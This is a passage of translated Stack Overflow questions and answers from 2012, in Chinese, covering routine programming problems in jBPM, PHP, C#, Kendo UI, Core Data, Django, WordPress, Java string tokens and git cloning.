            SelectedItem = null;
    }
} 
```

覆盖数据绑定。;)****

# java - BPMN 流程变量

> ID：13822230
> 
> 赞同：2
> 
> 时间：2012-12-11T14:49:48.370
> 
> 标签：java, jbpm, business-process-management, bpmn

我正在使用 JPBM 使用 BPMN2 来设计流程。我想在脚本任务中实例化一个类对象，例如：

```
Map<String, Object> params = new HashMap<String, Object>();    
Person p = new Person("moi");    
params.put("person", p);    
ksession.startProcess("com.sample.bpmn.hello", params); 
```

当我进入 BPMN 并创建流程变量以便我可以在脚本任务中访问它时，我收到以下错误：“无法将人员解析为类型”

那么如何通过 BPMN 访问该对象呢？提前致谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T09:39:38.963

弄清楚了。创建流程变量时，您必须将其定义为`Object`并在 Class Name 中提供包路径。例如，我不仅要创建一个对象 type `Person`，还必须实际键入`com.sample.Person`，其中`com.sample`是包名称。所有变量读取和更改（`get`和`set`方法）都是用`kcontext.getVariable("var")`and完成的`kcontext.setVariable("var", newValue)`。

希望这对任何人都有帮助:)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-06-03T12:15:43.380

要解决该问题，请`Person`在`Process`. 对于那个打开进程的属性，你可以在那里找到`imports`属性。

因此，您可以`Person`通过添加导入来导入该类。您必须在类属性中指定完全限定名称。

# php - php做while然后做别的事情？

> ID：13822237
> 
> 赞同：0
> 
> 时间：2012-12-11T14:50:05.147
> 
> 标签：php, do-while

不知道为什么这给了我地狱-但我确信这是一个简单的解决方法，我只是没有看到..？

我的查询显示了即将到来的 7 个事件徽标..

[LOGO] [LOGO] [LOGO] [LOGO] [LOGO] [LOGO] [LOGO]

```
$query_Recordset3 = "SELECT id, event_type, event_type_2, event_name,
event_logo,event_date  FROM event_calendar WHERE review_live = 1 AND
event_logo > '0' AND event_date >= CURDATE() ORDER BY event_date ASC
LIMIT 7"; 
```

我的小问题：如果我的活动没有徽标.. 所以它只显示一个或几个而不是 7 个。

如果有两个带有徽标的事件，现在情况如何：

[标志] [标志] [x] [x] [x] [x] [x]

我正在尝试想出一种方法来为我的其余“徽标图像”显示默认值

我希望它看起来如何

[LOGO] [LOGO] [默认] [默认] [默认] [默认] [默认]

我的查询不正确还是我只需要做一个花哨的“do while”？？

谢谢我的忍者！！抱歉，如果还有其他的 do while 和 query 问题.. 我只是没有找到我要找的东西 :-)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T14:54:21.003

只需计算您获得的行数，然后填写，直到您有 7 个徽标

```
<?php
$query_Recordset3 = "SELECT id, event_type, event_type_2, event_name,
event_logo,event_date  FROM event_calendar WHERE review_live = 1 AND
event_logo > '0' AND event_date >= CURDATE() ORDER BY event_date ASC
LIMIT 7";

$result = $mysqli->query($query_Recordset3) or die(mysqli_error());
for ($i = 0; $row = $result->fetch_row(); $i++) {
    // process row, show logo
}

for (; $i < 7; $i++) {
    // show default
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-11T14:52:23.087

像这样的东西：

```
$logocount = 7;
while(/*fetch mysql result here*/) {
    //output a logo
    $logocount--;
}
echo str_repeat("Default logo here",$logocount); 
```

# layout - 适用于 Windows Phone 的 Android 相对布局

> ID：13822240
> 
> 赞同：0
> 
> 时间：2012-12-11T14:50:10.200
> 
> 标签：layout, windows-phone-8, windows-phone

我目前正在尝试为联系信息设计一个表格，其中包括电话、电子邮件或类似符号等图标的列，我想将它们与下一列中的文本对齐

```
icon | Telephone:
     | +1212354567
icon | Email:
     | x@y.com 
```

是否有任何布局可以在功能上与[Android 的 RelativeLayout](http://developer.android.com/reference/android/widget/RelativeLayout.html)进行比较？我尝试使用网格布局，但这似乎容易出错且不够精确。我不想将我的布局划分为列和行，而是想描述它们在 RelativeLayout 中使用的位置（toLeft、toRight、AlignParentBottom 等）。

StackPanel 可以与 LinearLayout 进行比较，我想避免使用它，因为它不适合我当前的设计。

Windows Phone 和 Android 布局之间是否有我可以定位的比较？[这个](http://windowsphone.interoperabilitybridges.com/articles/android-to-wp7-chapter-2-user-interface-guidelines)是不完整的，没有为RelativeLayout提供建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T15:04:31.073

我知道你说过你不想使用网格，但我觉得在这种情况下你必须这样做。

不过，我会用网格和堆栈面板来构建它。

```
<Grid>
    <Grid.ColumnDefinitions>
        <ColumnDefinition />
        <ColumnDefinition />
    </Grid.ColumnDefinitions>
    <Grid.RowDefinitions>
        <RowDefinition />
        <RowDefinition />
    </Grid.RowDefinitions>

    <!-- Image for first row item -->
    <Image Grid.Column="0" Grid.Row="0" Source="icon-url" />
    <!-- Container for the details of the first row item -->
    <StackPanel Grid.Column="1" Grid.Row="0">
        <TextBlock Text="Telephone:" />
        <TextBlock Text="+1212354567" />
    </StackPanel>

    <!-- Image for second row item -->
    <Image Grid.Column="0" Grid.Row="1" Source="icon-url" />
    <!-- Container for the details of the second row item -->
    <StackPanel Grid.Column="1" Grid.Row="1">
        <TextBlock Text="Email:" />
        <TextBlock Text="x@y.com" />
    </StackPanel>

    <!-- Just add rows to the grid to continue the list -->
</Grid> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T15:02:05.300

没有可比较的面板，但有冒险精神的人可以创建一个。有很多关于如何做到这一点的文章，但这里有一篇供参考。[http://www.switchonthecode.com/tutorials/wpf-tutorial-creating-a-custom-panel-control](http://www.switchonthecode.com/tutorials/wpf-tutorial-creating-a-custom-panel-control)

也就是说，没有理由不使用 Grid 来做你想做的事情。它不是“容易出错”或“不够准确”。不过，SharedSizeGroup 应该在这里成为您的朋友。

# c#-4.0 - 使用英特尔标准转换 C# 负 IP 地址到点分十进制

> ID：13822243
> 
> 赞同：0
> 
> 时间：2012-12-11T14:50:12.447
> 
> 标签：c#-4.0

我想在这方面得到一些帮助，因为我已经花了几个小时来做​​这件事，但我做不到。我想编写一个带符号整数的函数，并使用 Intel 标准算法将其转换为点 IP 地址，这是一个示例：

IP 地址 192.168.18.188 显示为 -1139627840。要使用 Intel 标准转换此 IP 地址，我将必须执行以下过程：

1.  将 (-1139627840) 转换为十六进制值。BC12A8C0。
2.  反转十六进制字节，如下图： CO A8 12 BC
3.  将字节从十六进制转换为十进制，如下图： 192 168 18 188
4.  IP 地址以以下格式显示：192.168.18.188

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T15:20:07.883

我知道这并不能回答您关于英特尔标准的问题，而只是将其扔在那里（以防您试图重新发明轮子），您可以将 int 转换为 IP，如下所示：

```
string ip = new IPAddress(BitConverter.GetBytes(-1139627840)).ToString(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T15:02:53.427

神奇之处在于结合：

*   运算符`>>`，将数字中的位向右移动
*   运算符，按`&`位与（更常见`&&`的是逻辑与）

所以是这样的：

```
var number = -1139627840;
var b1 = number & 255;
var b2 = (number >> 8) & 255;
var b3 = (number >> 16) & 255;
var b4 = (number >> 24) & 255;
Console.WriteLine(string.Format("{0}.{1}.{2}.{3}", b1, b2, b3, b4)); 
```

# jquery - 如何更改已过滤单元格中的过滤器颜色

> ID：13822244
> 
> 赞同：3
> 
> 时间：2012-12-11T14:50:12.710
> 
> 标签：jquery, filter, kendo-ui

我有这个我无法解决的问题......这是我的网格

```
$("#grid").kendoGrid({
    dataSource: {
        type: "application/jsonp",
        transport: {
            read: {
                url: "http://" + servername + "/uBillingServices/Administration/Administration.svc/getPriceList",
                dataType: "json",
                //type: "POST",
                data: {
                    ValidFrom: denes
                }
            }
        },
        batch: false,
        schema: {
            model: {
                id: "PriceListType_ID",
                fields: {
                    ID: {
                        type: "number",
                        editable: false,
                        validation: {
                            required: true
                        },
                        nullable: false
                    },
                    PriceListType_ID: {
                        type: "number",
                        editable: false,
                        validation: {
                            required: true
                        },
                        nullable: false
                    },
                    PriceListType_Name: {
                        type: "string",
                        editable: false,
                        validation: {
                            required: true
                        },
                        nullable: false
                    },
                    BillingItem_ID: {
                        type: "number",
                        editable: false,
                        validation: {
                            required: true
                        }
                    },
                    BillingItem_Name: {
                        type: "string",
                        editable: false,
                        validation: {
                            required: true
                        }
                    },
                    FromConsumption: {
                        type: "number",
                        validation: {
                            required: true
                        },
                        editable: true
                    },
                    ValidFrom: {
                        type: "date",
                        validation: {
                            required: true
                        },
                        editable: true
                    },
                    Price: {
                        type: "number",
                        validation: {
                            required: true
                        },
                        editable: true
                    },
                    AllowDelete: {
                        type: "number",
                        validation: {
                            required: true
                        },
                        editable: true
                    }
                }
            }
        },
        pageSize: 10
    },
    //select: function () {$("#grid").style.visibility="visible";},
    change: function(arg) {
        $("#Meni")[0].childNodes[0].style.visibility = "visible";
        Selectedrow = this.select();
        if (this.dataItem(Selectedrow).AllowDelete) {
            $("#Meni")[0].childNodes[1].style.visibility = "visible";
        }
        selectedID = this.dataItem(Selectedrow).ID;
        selectedPriceList = this.dataItem(Selectedrow).PriceListType_Name;
        selectedPriceListID = this.dataItem(Selectedrow).PriceListType_ID;
        selectedBillingItem = this.dataItem(Selectedrow).BillingItem_Name;
        selectedBillingItemID = this.dataItem(Selectedrow).BillingItem_ID;
        selectedFromConsumption = this.dataItem(Selectedrow).FromConsumption;
        var tempselectedValidFrom = this.dataItem(Selectedrow).ValidFrom;
        selectedValidFrom = formatDate(tempselectedValidFrom);
        selectedPrice = this.dataItem(Selectedrow).Price;
        //selectedFilter = this.dataItem(SelectedCell).Filter;
    },
    scrollable: true,
    selectable: true,
    height: 388,
    filterable: true,
    pageable: {
        numeric: true,
        pageSizes: true,
        previousNext: false
        //refresh: true
    },
    columns: [
        {
        field: "PriceListType_Name",
        title: "Price List"},
    {
        field: "BillingItem_Name",
        title: "Billing Item"},
    {
        field: "FromConsumption",
        title: "Consumption"},
    {
        field: "ValidFrom",
        title: "Valid From",
        format: "{0:yyyy-MM-dd}"},
    {
        field: "Price",
        title: "Price",
        format: "{0:c}"}
    ]
}).data("kendoGrid");​ 
```

我使它可过滤并且知道我想访问过滤器，以便当我单击过滤器并进行过滤时，过滤器颜色会改变（或者可能是已过滤的单元格的背景）

我对此很陌生，所以我真的需要你的帮助

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-11T15:19:12.517

在你的 CSS 文件中尝试这样的事情：

```
 .k-state-active, .k-state-active:hover, .k-active-filter {
 background-color: rgba(0, 133, 255, 0.59) !important;
 } 
```

# c# - 使用 Google Analytics 的 Javascript 返回 Null 值，未捕获数据

> ID：13822245
> 
> 赞同：0
> 
> 时间：2012-12-11T14:50:19.620
> 
> 标签：c#, google-analytics, sitecore

我正在尝试为用户输入邮政编码然后单击按钮搜索数据库的文本框捕获谷歌分析数据。该应用程序是用 C# 编写的，这里是按钮部分的代码：

```
<p></p>
<p>
    <asp:Panel DefaultButton="btnSalesRepSearch" runat="server">
    <asp:TextBox ID="txtZipCode" runat="server" ClientIDMode="Static" Width="300px"></asp:TextBox>
        <asp:Button ID="btnSalesRepSearch" runat="server" ClientIDMode="Static" CssClass="buttonregular" Text="Search" OnClick="btnSalesRepSearch_Click" />
        <asp:RequiredFieldValidator ID="reqTxtZipCode" runat="server" ValidationGroup="ZipCode" ControlToValidate="txtZipCode" Display="Dynamic" ErrorMessage="Please enter a valid US Zip code" CssClass="error"></asp:RequiredFieldValidator>
        <asp:RegularExpressionValidator ID="regExTxtZipCode" runat="server" ValidationExpression="^\d{5}(-\d{4})?$" ValidationGroup="ZipCode" ControlToValidate="txtZipCode" Display="Dynamic" ErrorMessage="Please enter a valid US Zip code" CssClass="error"></asp:RegularExpressionValidator>
     </asp:Panel>
</p> 
```

我正在尝试使用 Javascript 触发从文本框中捕获数据的谷歌分析事件，问题出在页面加载上我收到一条错误消息，指出提交按钮为 Null，并且没有任何内容会被捕获到 Google Analytics 中。这是我在下面使用的 Javascript。任何帮助将不胜感激。

```
<script type="text/javascript">
    var textbox = document.getElementById('txtZipCode'),
    submitButton = document.getElementById('btnSalesRepSearch');

    submitButton.onclick = function (txtZipCode) {
        _trackEvent('data-store', textbox.name, textbox.value, 0);
        // 'data-store' can be replaced with whatever category of data you want, for sortability's sake
        // the 0 can be replaced with any other numerical data you want - but it must be numerical
    }
    </script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:02:45.173

像 txtZipCode 这样的 ASP 服务器端 id 与在客户端生成的 id 不同。查看您的 html 源代码，您可以验证 id 是否不同。然后相应地更改您的 document.getElementById 选择器。

# java - 重启机器后，Grails 项目经常在 Eclipse 中未配置

> ID：13822248
> 
> 赞同：3
> 
> 时间：2012-12-11T14:50:31.463
> 
> 标签：java, eclipse, grails, groovy

我在 Java/Groovy/Grails 方面的经验很少，使用 Eclipse 大约 1 年，使用[GGTS 几周](http://grails.org/products/ggts)，而且我的项目总是遇到构建路径问题或其他相关问题，显然没有理由。环境好像有问题。任何提示？

下面是我正在处理的一个项目的屏幕截图，在计算机重新启动后，出现了很多疯狂的构建路径问题。 ![一个例子](../Images/c4bdf50c1191757b3e44089d68794b29.png)

PS.：为了解决这些问题，我在GGTS中关闭了项目，`grails clean`在控制台中使用了a，再次打开项目（所有问题仍然存在），然后我只是**看了一下**，`properties > Java Build Path`所有问题都消失了。这些步骤对我来说毫无意义。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-21T02:37:09.863

像其他人一样，我不会推荐 Eclipse。所有变体（sts、ggts、vanilla eclipse+plugins）至少在 Juno 上都是不稳定的，恕我直言。

我个人使用 emacs，但像 @James 一样，我建议使用 IntelliJ：

*   稳定，因为在进行 Grails 编码时没有出现奇怪的内部错误，没有项目损坏。
*   更好的完成，尤其是动态方法

# ios - tableView 显示标题使用核心数据（关系）

> ID：13822250
> 
> 赞同：0
> 
> 时间：2012-12-11T14:50:33.817
> 
> 标签：ios, core-data, tableview, cell, relation

我有 2 个实体（和两个 tableViews）我的第一个实体名称是 Person，第二个是 Event，在我的第一个 tableView 中有人的名字，第二个是他们的事件，我在 Person 和 Event 之间有一对多的关系。我只希望当用户点击其中一个名称时，第二个 tableView 将向他显示该人的事件（类型）。问题是我得到空单元格。

这就是我添加新事件的方式：

```
 - (void) addEventControllerDidSave{

        NSManagedObjectContext* context = [self managedObjectContext];
        Event *newEvent = (Event *)[NSEntityDescription insertNewObjectForEntityForName:@"Event" inManagedObjectContext:context];
        [newEvent setType:@"dennis"];
        [currentPerson addEventsObject:newEvent];

        NSError *error;
        if (![[self managedObjectContext] save:&error])
        {
            NSLog(@"Problem saving: %@", [error localizedDescription]);
        }

        [self dismissViewControllerAnimated:YES completion:nil];
    } 
```

我知道这种方法不是动态的，我总是会得到事件类型“dennis”，这只是为了测试。

我的第二个 tableView 方法：

```
- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
{
    return 1;
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    return [[[self currentPerson] events] count];
} 
```

最重要的方法我认为问题出在此处（或在保存方法中）：

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier = @"eventsCell";
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier forIndexPath:indexPath];

    if (nil == cell)
    {
        NSEnumerator *enumerator = [[[self currentPerson] events] objectEnumerator];
        Event *event = [[enumerator nextObject]objectAtIndexPath:indexPath];
        [[cell textLabel]setText:[event type]];
    }

    return cell;
} 
```

**更新：** 正如ophychius所说，我将我定义的细胞系移出if并将它们更改为：

```
//create cell use relation
    NSArray *eventsArray = [[[[self currentPerson] events] objectEnumerator]allObjects];
    Event *newEvent = [eventsArray objectAtIndex:indexPath.row];
    [[cell textLabel]setText: [newEvent type]]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T14:56:02.440

尝试移动线条

```
 NSEnumerator *enumerator = [[[self currentPerson] events] objectEnumerator];
    Event *event = [[enumerator nextObject]objectAtIndexPath:indexPath];
    [[cell textLabel]setText:[event type]]; 
```

在 if 块之外。如果您还没有一个单元格，则在 if 内部需要创建单元格的代码（您尝试在 if 块之前检索）

现在你可能没有创建单元格，如果你是，你没有在其中输入文本，因为一旦你有了一个单元格，if 块就会被跳过。

这是一个例子：

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {

    static NSString *CellIdentifier = @"Cell";

    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    if (cell == nil) {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];
    }

    NSEnumerator *enumerator = [[[self currentPerson] events] objectEnumerator];
    Event *event = [[enumerator nextObject]objectAtIndexPath:indexPath];
    [[cell textLabel]setText:[event type]];

    return cell;
} 
```

# c# - C# 多态性 - 为什么和何时

> ID：13822251
> 
> 赞同：2
> 
> 时间：2012-12-11T14:50:35.297
> 
> 标签：c#, polymorphism

我几乎是一名初级程序员，到目前为止，在我的经验中还没有遇到使用多态的要求。

我对多态性的基本理解是创建需要能够处理各种不同类型对象的东西。

我只是想知道是否有人可以提供一些体面的例子来说明您何时以及为什么会遇到这种情况。

对不起，如果我的问题看起来很愚蠢，我只是一个学习者。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T14:56:20.550

多态性在你有一个共同的契约时很有用，但行为因对象而异。例如，以无处不在的“工作”为例。您可能有一个类似的界面：

```
public interface IJob {
    void Execute(JobContext context);
} 
```

然后实现遵守此合同的各种作业，例如 DataPollingJob、MaintenanceJob、EmailJob、BalanceJob 等。无论运行什么作业，都不必知道实现是做什么或如何做的，但知道它可以`Execute`使用上下文调用以使该作业执行其功能。

多态性有用的另一个常见场景是消息传递。您可能有许多不同类型的消息，但它们都将遵守一些消息基础设施理解的基本合同。

# python - 初始化 Django 表单文件字段

> ID：13822252
> 
> 赞同：1
> 
> 时间：2012-12-11T14:50:36.707
> 
> 标签：python, django, django-forms, django-file-upload

我有一个 Django 表单类，例如；

```
class FileDefinitionForm(ModelForm):
    fileContent = forms.FileField(required=False)

    def __init__(self, *args, **kwargs):
        super(FileDefinitionForm, self).__init__(*args, **kwargs)
        ????Initialization of file field which is named "fileContentUpl" ??? 
```

我将我的文件作为字符串进行了 base64 解码，我需要在初始化时将文件放入我的 fileField 以在 html 中显示它。我尝试了一些东西，但我无法让它工作。有没有办法做到这一点 ？

谢谢你。

# javascript - JavaScript 中的图像链接

> ID：13822261
> 
> 赞同：0
> 
> 时间：2012-12-11T14:51:08.717
> 
> 标签：javascript, jquery, image

我想在 JavaScript 中创建一个图像链接而不是文本链接。我对 JavaScript 很陌生，我只是不明白为什么我所做的事情不起作用！它可以在 HTML 中工作。

这有效（文本链接“关闭 [x]”）：

```
 closeLinkString = "<div class='close'><a href='#' id='close-link' onclick=\"Megadropdowns.closeDropDown(); return false;\">close [x]</a></div>", // this is the close button 
```

但由于某种原因，这不会：

```
 closeLinkString = "<div class='close'><a href='#' id='close-link' onclick=\"Megadropdowns.closeDropDown(); return false;\"><img src="/images/loading.gif"></a></div>", // this is the close button 
```

谁能帮我解决这个问题？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-11T14:53:17.913

正如您从 SO 的语法高亮中看到的那样，您需要转义`"`in image 标记，`\"`而是使用：

```
closeLinkString = "<div class='close'><a href='#' id='close-link' onclick=\"Megadropdowns.closeDropDown(); return false;\"><img src=\"/images/loading.gif\"></a></div>" 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-11T14:53:25.243

任何具有基本颜色编码的编辑器，甚至您在此站点上的帖子，都会立即向您显示您没有转义图像中的引号。

# blackberry - 显示 HTTP 请求信息 - BlackBerry

> ID：13822263
> 
> 赞同：0
> 
> 时间：2012-12-11T14:50:33.247
> 
> 标签：blackberry, request, httpconnection

如何获取所有 HTTP 请求标头、方法、连接的后缀以及添加到请求中的所有参数？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T02:51:11.603

尝试这样的事情（我在后台线程上运行了这段代码，这就是我`UiApplication.invokeLater()`用来显示结果的原因）：

```
 try {
      ConnectionFactory factory = new ConnectionFactory();  // for OS 5.0+
      factory.setPreferredTransportTypes(new int[] { 
            TransportInfo.TRANSPORT_TCP_WIFI, 
            TransportInfo.TRANSPORT_TCP_CELLULAR 
      });
      // For OS < 5.0
      //HttpConnection conn = (HttpConnection) Connector.open("http://www.google.com;interface=wifi");
      HttpConnection conn = (HttpConnection) factory.getConnection("http://www.google.com").getConnection();
      conn.setRequestProperty("sessionId", "ABCDEF0123456789");

      final StringBuffer results = new StringBuffer();

      String key = "";
      int index = 0;
      // loop over all the header fields, and record their values
      while (key != null) {
         key = conn.getHeaderFieldKey(index);
         if (key != null) {
            String value = conn.getHeaderField(key);
            results.append(key + " = " + value + "\n\n");
         }
         index++;
      }

      results.append("method = " + conn.getRequestMethod() + "\n\n");

      // we (should) know which request properties we've set, so we ask 
      //  for them by name here
      String sessionId = conn.getRequestProperty("sessionId");
      results.append("sessionId = " + sessionId + "\n\n");

      String url = conn.getURL();
      results.append("URL = " + url);

      // show the result on screen (UI thread)
      UiApplication.getUiApplication().invokeLater(new Runnable() {
         public void run() {
            textField.setText(results.toString());                                                
         }
      });
   } catch (IOException e) {
      e.printStackTrace();
   } 
```

# android - Android 2.3 中的数字签名

> ID：13822268
> 
> 赞同：0
> 
> 时间：2012-12-11T14:51:17.690
> 
> 标签：android, digital-signature

我必须在 Android 中开发一个数字签名应用程序，它允许使用私钥对文档进行签名，这对于 Andorid 4.0 来说相当简单，因为有一个名为 android.security 的特定库可以执行此操作，但在较低的 API 中它没有存在。

主要问题是从手机中提取凭据，在 Android 4.0 中，使用“KeyChan”类非常容易，但在 Andorid 2.3 中我完全迷路了。

我可以重用整个代码，但类：

*   android.security.KeyChain;
*   android.security.KeyChainAliasCallback;
*   android.security.KeyChainException;

有什么想法或建议吗？有人知道Android 2.3 中是否有类似于“android.security”的库吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T10:24:40.937

Well, after a huge research I find out that is impossible to get access to the default device's KeyStore (actually is possible but just to get CA certificates not custom) before 4.0, the best solution is the creation of your default KeyStore in Java for your app.

# wordpress - WordPress搜索问题

> ID：13822269
> 
> 赞同：1
> 
> 时间：2012-12-11T14:51:23.863
> 
> 标签：wordpress, search, http-status-code-404

我已经研究过这个问题，但似乎仍然无法弄清楚为什么我的搜索功能不适用于我正在研究的主题。下面是我的 search.php 和 searchform.php 文件的代码。搜索文件几乎没有从样板的空白 WordPress 主题中修改。当我搜索任何内容时，它会返回 404 错误。我研究了搜索返回的 404，但仍然找不到解决方案。Blow 是我的代码，任何帮助将不胜感激。

searchform.php----------------------------------

```
<form action="<?php bloginfo('siteurl'); ?>" id="searchform" method="get">
        <label for="search"><object data='<?php bloginfo('template_directory');?    >/images/input-search.svg'>
        <img src='<?php bloginfo('template_directory');?>/images/input-search.png'>
        </object></label>
        <input type="search" name="search" />
</form> 
```

search.php----------------------------------------------------

```
<?php get_header(); ?>

<?php if (have_posts()) : ?>

    <h2>Search Results</h2>

    <?php include (TEMPLATEPATH . '/inc/nav.php' ); ?>

    <?php while (have_posts()) : the_post(); ?>

        <div <?php post_class() ?> id="post-<?php the_ID(); ?>">

            <h2><?php the_title(); ?></h2>

            <?php include (TEMPLATEPATH . '/inc/meta.php' ); ?>

            <div class="entry">

                <?php the_excerpt(); ?>

            </div>

        </div>

    <?php endwhile; ?>

    <?php include (TEMPLATEPATH . '/inc/nav.php' ); ?>

<?php else : ?>

    <h2>No posts found.</h2>

<?php endif; ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:07:22.850

您需要确保在您的 functions.php 文件中启用了您的搜索表单，如下所示：

```
 // ENABLES SEARCH FORM STUFF
 function my_search_form( $form ) {

$form = '<form role="search" method="get" id="searchform" action="' . home_url( '/' ) . '" >
<div><label class="screen-reader-text" for="s">' . __('Search for:') . '</label>
<input type="text" value="' . get_search_query() . '" name="s" id="s" />
<input type="submit" id="searchsubmit" value="'. esc_attr__('Search') .'" />
</div>
</form>';

return $form; 
```

}

```
 // ENABLES SEARCH FORM
 add_filter( 'get_search_form', 'my_search_form' ); 
```

这是我在主题中使用的代码。然后这会在我的搜索表单中调用：

```
 <?php get_search_form(); ?> 
```

这是我的 searchform.php

```
 <form method="get" id="searchform" action="<?php echo esc_url( home_url( '/' ) ); ?>">
     <label for="s" class="assistive-text"><?php _e( 'Search' ); ?></label>
     <input type="text" class="field" name="s" id="s" placeholder="<?php esc_attr_e( 'Search' ); ?>" />
     <input type="submit" class="submit" name="submit" id="searchsubmit" value="<?php esc_attr_e( 'Search' ); ?>" />
    </form> 
```

# java - 在 Java 中生成字符串标记

> ID：13822270
> 
> 赞同：1
> 
> 时间：2012-12-11T14:51:27.237
> 
> 标签：java

我想在 Java 中使用前向遍历生成可能的标记。例如，如果我有一个字符串“这是我的车”。我需要生成令牌

*   “这是我的车”
*   “这是我的”
*   “这是”
*   “这”
*   “是我的车”
*   “是我的”
*   “是”
*   “我的车”
*   “我的”
*   “车”

做这个的最好方式是什么？有什么例子吗？谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-11T15:13:25.423

这是另一个具有**拆分**和嵌套循环的解决方案：

```
public static void main(String[] args) {
    String original = "this is my car";

    String[] singleWords = original.split(" ");  // split the String to get the single words
    ArrayList<String> results = new ArrayList<String>();  // a container for all the possible sentences
    for (int startWord = 0; startWord < singleWords.length; startWord++) {  // starWords start with 0 and increment just until they reach the last word
        for (int lastWord = singleWords.length; lastWord > startWord; lastWord--) { // last words start at the end and decrement just until they reached the first word 
            String next = "";
            for (int i = startWord; i != lastWord; i++) { // put all words in one String (starting with the startWord and ending with the lastWord)
                next += singleWords[i] + " "; 
            }
            results.add(next);  // add the next result to your result list
        }
    }

    // this is just to check the results. All your sentences are now stored in the ArrayList results
    for (String string : results) {
        System.out.println("" + string);
    }
} 
```

这是我测试该方法时的结果：

```
this is my car 
this is my 
this is 
this 
is my car 
is my 
is 
my car 
my 
car 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-11T15:00:55.610

使用[番石榴](https://code.google.com/p/guava-libraries/)：

```
String yourOriginalString = "This is my car";
final Set<String> originalWords = 
        Sets.newLinkedHashSet(
                Splitter.on(CharMatcher.WHITESPACE).trimResults().split(yourOriginalString));
final Set<Set<String>> variations = Sets.powerSet(originalWords);
for (Set<String> variation : variations) {
    System.out.println(Joiner.on(' ').join(variation));
} 
```

输出：

```
This
is
This is
my
This my
is my
This is my
car
This car
is car
This is car
my car
This my car
is my car
This is my car 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-11T15:04:20.620

这是一种可能的方法：

```
//Just a method that seperates your String into an array of words based on the spaces
//I'll leave that for you to figure out how to make
String[] array = getSeperatedWords(<yourword>);
List<StringBuffer> bufferArray = new ArrayList<StringBuffer>();

for(int i = 0; i < array.length; i++){
    StringBuffer nowWord = array[i];
    for(int j = i; j < array.length; j++{
        nowWord.append(array[j]);
    }
    bufferArray.add(nowWord);
 }
 for(int i = 0; i < bufferArray.length; i++){
    System.out.print(bufferArray.get(i));
 } 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-11T15:17:47.257

```
import java.util.Arrays;

public class Test {

    public static void main(String[] args) {

        String var = "This is my car";
        permute(var);

    }

    public static void permute(String var) {

        if(var.isEmpty())
            return;

        String[] arr = var.split(" ");  

        while(arr.length > 0) {
            for(String str : arr) {
                System.out.print(str + " ");
            }
            arr = (String[]) Arrays.copyOfRange(arr, 0, arr.length - 1);
            System.out.println();               
        }       

        String[] original = var.split(" ");
        permute(implodeArray((String[]) Arrays.copyOfRange(original, 1, original.length), " "));

    }

    public static String implodeArray(String[] inputArray, String glueString) {

        String output = "";

        if (inputArray.length > 0) {
            StringBuilder sb = new StringBuilder();
            sb.append(inputArray[0]);

            for (int i=1; i<inputArray.length; i++) {
                sb.append(glueString);
                sb.append(inputArray[i]);
            }

            output = sb.toString();

        }

        return output;

    }        

} 
```

阅读本书，你将成为递归大师：http: [//mitpress.mit.edu/sicp/](http://mitpress.mit.edu/sicp/)

# git - 致命：协议错误：尝试 git clone 时预期旧/新/参考

> ID：13822274
> 
> 赞同：1
> 
> 时间：2012-12-11T14:50:59.893
> 
> 标签：git

我的 Git 存储库有一个奇怪的问题。*在我的机器*上克隆 repo工作得很好，但我的同事无法在他的机器上克隆 repo。这是交易：

我的用户，在我的 Mac OS X 机器上：工作得很好

我同事的 Arch Linux 机器上的用户，同样的命令：不起作用

因此，除了机器之外，一切都完全相同。我们得到的错误是这样的：

> 致命：协议错误：预期的旧/新/参考，得到'想要 db29ccc950e5b89bfa9084768de3b9c0feeb3494 side-band-64k ofs-delta' 致命：远程端意外挂断

任何想法为什么会发生这种情况？

**编辑**：

命令：

```
git clone -u /var/www/vhosts/mysite.com/bin/git-upload-pack \
  ssh://myuser@mysite.com/var/git/myrepo.git 
```

回购的地方：

```
ssh://myuser@mysite.com/var/git/myrepo.git 
```

我的 Git 版本：1.7.5

同事的Git版本：1.8.0

# html - 为 Retina 显示器优化 HTML5 视频？

> ID：13822275
> 
> 赞同：1
> 
> 时间：2012-12-11T14:51:32.790
> 
> 标签：html, video, retina-display

我想提供视频的低分辨率和高分辨率版本，后者是用于视网膜显示器的。该视频应嵌入到 html5 页面中。特别是这将是一个 iPad 网络应用程序。

